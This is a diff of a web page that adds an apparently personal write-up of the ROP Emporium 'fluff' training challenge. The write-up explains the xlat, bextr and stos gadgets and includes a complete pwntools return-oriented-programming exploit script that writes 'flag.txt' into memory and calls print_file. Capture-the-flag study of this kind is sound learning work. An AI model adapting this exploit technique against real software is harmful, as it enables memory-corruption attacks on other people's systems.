@@ -1,14 +1,108 @@
 <div class="page-header">
     <div class="page-header-inner">
         <div class="page-header-inner2">
-            <h1>Rop-Emporium - Fluff</h1>
+            <h1>Fluff Writeup</h1>
+            <h2>May 2021</h2>           
+            <h4>Write string into memory with difficult gadgets</h4>           
         </div>
     </div>
 </div>
+<H4>Problem</H4>
 <div class="paragraph">
-    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Distinctio excepturi asperiores voluptate quisquam! Temporibus minus esse obcaecati recusandae exercitationem quam adipisci laboriosam veniam, est molestiae reiciendis at, nobis autem soluta?</p>
+    <p>
+        Sort the useful gadgets from the fluff to construct another write primitive in this challenge. You'll have to get creative though, the gadgets aren't straightforward.<a href=../../docs/rop_emporium/fluff>fluff</a>
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally.
+        <br>
+    	This binary is quite similar to the previous write4 challenge. It has a win function that opens and prints out a file for us. We need to manually write the string 
+		"flag.txt" into memory, so that we can then pass it to our function. 
+        <br>
+		So far the challenge sounds exactly the same as write4, however the gadgets we have available to accomplish this task are much harder to work with. We are given 
+		a function called 'questionableGadgets' to work with. The interesting gadgets in here that we will need for our exploit are xlat, bextr and stos.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/fluff1.png" alt="">
 </div>
 <div class="paragraph">
-    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Laudantium inventore vel ut, a eum harum. Aliquam est hic maxime, temporibus neque minima optio, quia alias sequi non dolores distinctio dolore?</p>
+    <p>
+        <br><br>
+		Eventhough it may not look like it on first glance, the above gadgets are pretty much all we need to successfully write the string "flag.txt" into memory. 
+		<br>
+		1. bextr: This gadget in combination with the previous instructions allows us to place the location of our character into ebx
+		<br>
+		2. xlat: This gadget sets al equal to rbx + al. We can set al to 0 prior to starting our chain, and since we control rbx using bextr, we have control over al.
+		<br>
+		3. stos: This gadget basically does: 'mov [rdi], al ; inc rdi'. Since we have control over both al and rdi, we can write al to an arbitrary location in memory.
+        <br><br>
+    </p>
 </div>
+<div class="paragraph">
+    <p>
+        <br><br>
+		We now have everything we need to store our string into memory. To start off we first set rdi to a location in memory to which we want to write our string. We can then loop through our "flag.txt" string and use pwntools 'elf.search()' function to retrieve the address of each individual char.	We can then use the bextr gadget with appropriate arguments in combination with this address to set rbx to the address of each character. Next we can call xlat and stos, to first set al correctly using rbx, and then write the character to rdi. Stos automatically increments rdi, so the next character will automatically be written to the next byte in memory on the next loop iteration.
+		<br>
+		We can now call the print_file function using our "flag.txt" location as its argument to retrieve the flag. The full exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/fluff2.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./fluff')
+libc = elf.libc
+p = elf.process()
+
+string = "flag.txt"
+tmp = 0
+
+write_loc = 0x601038
+pop_rdi = p64(0x4006a3)
+eax_0 = p64(0x400610)       #mov eax, 0 ; pop reg
+print_file = p64(0x400620)
+bextr = p64(0x40062a)       #pop rdx,rcx ; bextr rbx,rcx,rdx
+xlat = p64(0x400628)        #al = rbx+al
+stos = p64(0x400639)        #write al to rdi + increment rdi
+
+#padding + set al to 0 + set rdi to our write location
+payload = b"A"*40 + eax_0 + b'BBBBBBBB' + pop_rdi + p64(write_loc)
+
+for c in string:
+    addr = next(elf.search(ord(c)))                         #retrieve address of each char
+    buf = bextr + p64(0x4000) + p64(addr -  0x3ef2 - tmp)   #use bxtr to set rbx to the value of address
+    buf += xlat                                             #use xlat to set al to rbx
+    buf += stos                                             #use stos to write al to memory at location rdi
+    payload += buf
+    tmp = ord(c)
+
+payload += pop_rdi + p64(write_loc) + print_file            #call print_file function
+
+p.sendline(payload)
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
